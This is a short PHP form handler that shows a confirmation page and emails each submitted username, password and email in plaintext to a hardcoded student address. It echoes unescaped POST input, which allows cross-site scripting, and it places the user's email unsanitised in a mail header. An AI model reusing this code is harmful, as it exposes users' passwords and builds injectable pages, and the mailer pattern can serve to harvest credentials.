<html>
<body>
    <p><strong>Your information has been emailed successfully!!</strong></p>
    <p>Username: <?php echo $_POST["username"] ?>
    <p>Email   : <?php echo $_POST["email"] ?>
</body>
</html>

<?
$msg = "Information from YOUR WEBSITE\n";
$msg .="Username: $_POST[username]\n";
$msg .="Password: $_POST[password]\n";
$msg .="Email: $_POST[email]\n";
$to ="80609@siswa.unimas.my";
$subject = "YOUR WEBSITE";
$mailheaders = "\nFrom: YOUR WEBSITE\n";
$mailheaders .="Reply To: $_POST[email]\n";
mail($to, $subject, $msg, $mailheaders);
?>
